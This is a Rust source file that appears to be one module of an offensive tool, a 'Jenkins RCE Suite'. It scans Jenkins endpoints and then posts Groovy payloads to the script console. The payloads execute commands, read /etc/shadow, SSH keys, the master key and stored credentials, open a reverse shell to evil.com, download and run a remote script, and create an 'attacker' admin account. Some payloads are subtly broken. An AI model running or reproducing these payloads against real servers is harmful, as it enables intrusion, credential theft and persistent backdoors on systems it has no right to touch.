use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const JENKINS_ENDPOINTS: &[(&str, &str)] = &[
    ("Jenkins root", "/"),
    ("Login", "/login"),
    ("API JSON", "/api/json"),
    ("Computer API", "/computer/api/json"),
    ("People", "/asynchPeople/api/json"),
    ("Builds", "/api/json?tree=jobs[name,builds[number,result,timestamp]]"),
    ("Plugins", "/pluginManager/api/json"),
    ("Credentials", "/credentials/store/system/domain/_/api/json"),
    ("Script console", "/script"),
    ("Script text", "/scriptText"),
    ("CLI", "/cli"),
    ("JNLP", "/computer/(master)/slave-agent.jnlp"),
    ("Remoting", "/tcpSlaveAgentListener"),
    ("Who am I", "/whoAmI/api/json"),
    ("System info", "/systemInfo"),
    ("Load statistics", "/load-statistics/api/json"),
    ("Queue", "/queue/api/json"),
    ("Build queue", "/queue/api/json?tree=items[id,task[name]]"),
    ("Nodes", "/computer/api/json?tree=computer[displayName,offline,executors]"),
    ("Artifacts", "/api/json?tree=jobs[name,builds[artifacts[fileName,relativePath]]]"),
];

const GROOVY_PAYLOADS: &[(&str, &str)] = &[
    ("Command execution", "println \"whoami\".execute().text"),
    ("Command execution — array", "println [\"sh\", \"-c\", \"whoami\"].execute().text"),
    ("Env exfil", "println \"env\".execute().text"),
    ("Read /etc/passwd", "println new File(\"/etc/passwd\").text"),
    ("Read ~/.ssh/id_rsa", "println new File(System.getProperty(\"user.home\") + \"/.ssh/id_rsa\").text"),
    ("List Jenkins secrets", "println new File(System.getProperty(\"user.home\") + \"/.jenkins/secrets\").listFiles()"),
    ("List credentials", "def creds = Jenkins.instance.getExtensionList(com.cloudbees.plugins.credentials.SystemCredentialsProvider.class)[0].getCredentials(); creds.each { println it }"),
    ("Decrypt secrets", "println hudson.util.Secret.fromString(\"ENCRYPTED_SECRET\").getEncryptedValue()"),
    ("Master key", "println new File(System.getProperty(\"user.home\") + \"/.jenkins/secrets/master.key\").text"),
    ("List jobs", "Jenkins.instance.items.each { println it.name + \" \" + it.configFile }"),
    ("Read job config", "Jenkins.instance.items.each { println it.name + \": \" + new File(it.rootDir, \"config.xml\").text }"),
    ("Execute shell", "def proc = \"id; cat /etc/shadow\".execute(); println proc.text"),
    ("Reverse shell", "def socket = new Socket(\"evil.com\", 4444); def proc = [\"/bin/sh\", \"-i\"].execute();"),
    ("Download file", "def url = new URL(\"https://evil.com/shell.sh\"); def f = new File(\"/tmp/shell.sh\"); f << url.text; f.exec()"),
    ("Disable security", "Jenkins.instance.getDescriptor(org.jenkinsci.main.modules.instance_identity.InstanceIdentityProvider.class).setEnabled(false)"),
    ("Create admin", "def user = hudson.model.User.get(\"attacker\"); user.setFullName(\"Attacker\"); def pwd = hudson.security.HudsonPrivateSecurityRealm.Details.fromPlainPassword(\"attacker123\"); user.addProperty(pwd)"),
    ("Read environment", "System.getenv().each { println it.key + \"=\" + it.value }"),
    ("Read system props", "System.getProperties().each { println it.key + \"=\" + it.value }"),
    ("Thread dump", "Thread.getAllStackTraces().keySet().each { println it.getName() }"),
    ("File system listing", "new File(\"/\").listFiles().each { println it.getAbsolutePath() }"),
    ("Network scan", "def socket = new Socket(); socket.connect(new InetSocketAddress(\"127.0.0.1\", 8080), 1000); println \"open\""),
];

pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} Jenkins RCE Suite", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{} {} API endpoints, {} Groovy payloads", "[*]".cyan().bold(), JENKINS_ENDPOINTS.len(), GROOVY_PAYLOADS.len());
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let base = url.trim_end_matches('/');

    println!("\n{} [1/3] Jenkins endpoint discovery...", "[*]".cyan().bold());
    let mut found = Vec::new();
    let mut unauthenticated = false;

    for (name, path) in JENKINS_ENDPOINTS {
        let full_url = format!("{}{}", base, path);
        match client.get(&full_url).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accessible = status == 200;
                let has_json = body.contains("{") && body.contains("}");
                let has_creds = body.contains("credential") || body.contains("secret") || body.contains("password");
                let has_jobs = body.contains("job") || body.contains("build");
                let has_script = path.contains("script");
                let tag = if accessible {
                    if has_script { "SCRIPT CONSOLE".red().bold().to_string() }
                    else if has_creds { "CREDENTIALS".red().bold().to_string() }
                    else if has_jobs { "JOBS".green().bold().to_string() }
                    else if has_json { "API".green().to_string() }
                    else { "accessible".green().to_string() }
                } else if status == 403 {
                    "forbidden".yellow().to_string()
                } else if status == 401 {
                    "auth".yellow().to_string()
                } else if status == 404 {
                    "not found".dimmed().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
                if accessible {
                    found.push(*name);
                    if !path.contains("login") && status == 200 && !path.contains("script") {
                        unauthenticated = true;
                    }
                    if has_creds {
                        println!("    {} {}", ">".red().bold(), body.chars().take(200).collect::<String>());
                    }
                }
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    println!("\n{} [2/3] Script console RCE...", "[*]".cyan().bold());
    let mut rce_results = Vec::new();
    let script_url = format!("{}/scriptText", base);

    for (name, payload) in GROOVY_PAYLOADS {
        let body = format!("script={}", urlencoding_encode(payload));
        match client.post(&script_url)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(body)
            .send()
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let resp_body = resp.text().await.unwrap_or_default();
                let has_result = !resp_body.is_empty() && (resp_body.contains("Result:") || !resp_body.contains("error"));
                let has_error = resp_body.contains("Exception") || resp_body.contains("GroovyError");
                let has_data = resp_body.contains("root") || resp_body.contains("admin") || resp_body.contains("SECRET")
                    || resp_body.contains("credential") || resp_body.contains("password") || resp_body.contains("open");

                let tag = if has_data {
                    "DATA EXFIL".red().bold().to_string()
                } else if has_result && !has_error {
                    "EXECUTED".red().bold().to_string()
                } else if has_error {
                    "error".dimmed().to_string()
                } else if status == 403 || status == 401 {
                    "auth".yellow().to_string()
                } else {
                    format!("status {}", status)
                };

                println!("  {} [{:02}] {:35} status={} {}", "*".cyan(), rce_results.len() + 1, name, status, tag);
                if has_data || (has_result && !has_error) {
                    println!("    {} {}", ">".red().bold(), resp_body.chars().take(200).collect::<String>());
                    rce_results.push(*name);
                }
            }
            Err(_) => {
                println!("  {} [{:02}] {:35} error", "*".red(), rce_results.len() + 1, name);
            }
        }
    }

    println!("\n{} [3/3] Credential extraction...", "[*]".cyan().bold());
    let cred_url = format!("{}/credentials/store/system/domain/_/api/json", base);
    match client.get(&cred_url).send().await {
        Ok(resp) => {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            let has_creds = body.contains("credential") || body.contains("Secret") || body.contains("Username");
            let tag = if has_creds { "CREDENTIALS FOUND".red().bold().to_string() } else { format!("status {}", status) };
            println!("  {} Credentials API: status={} {}", "*".cyan(), status, tag);
            if has_creds {
                println!("    {} {}", ">".red().bold(), body.chars().take(300).collect::<String>());
            }
        }
        Err(_) => {
            println!("  {} Credentials API: error", "*".red());
        }
    }

    println!(
        "\n{} {} endpoints accessible, {} / {} Groovy payloads executed",
        "[*]".cyan().bold(),
        found.len(),
        rce_results.len(),
        GROOVY_PAYLOADS.len()
    );

    if unauthenticated {
        println!("{} [CRITICAL] Unauthenticated access to Jenkins API!", "[!]".red().bold());
    }
    let has_script = found.iter().any(|n| n.contains("Script") || n.contains("script"));
    if has_script {
        println!("{} [CRITICAL] Script console accessible — full RCE!", "[!]".red().bold());
    }
    if !rce_results.is_empty() {
        let has_cred = rce_results.iter().any(|n| n.contains("credential") || n.contains("Credential") || n.contains("secret") || n.contains("Secret") || n.contains("Master"));
        let has_file = rce_results.iter().any(|n| n.contains("Read") || n.contains("List") || n.contains("File"));
        let has_exec = rce_results.iter().any(|n| n.contains("Command") || n.contains("Execute") || n.contains("shell") || n.contains("reverse"));
        if has_cred {
            println!("{} [CRITICAL] Credential/secret extraction successful!", "[!]".red().bold());
        }
        if has_file {
            println!("{} [HIGH] File system access confirmed!", "[!]".red().bold());
        }
        if has_exec {
            println!("{} [CRITICAL] Command execution confirmed — full server compromise!", "[!]".red().bold());
        }
    }

    Ok(())
}

fn urlencoding_encode(s: &str) -> String {
    s.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '~' {
                c.to_string()
            } else {
                format!("%{:02X}", c as u8)
            }
        })
        .collect()
}
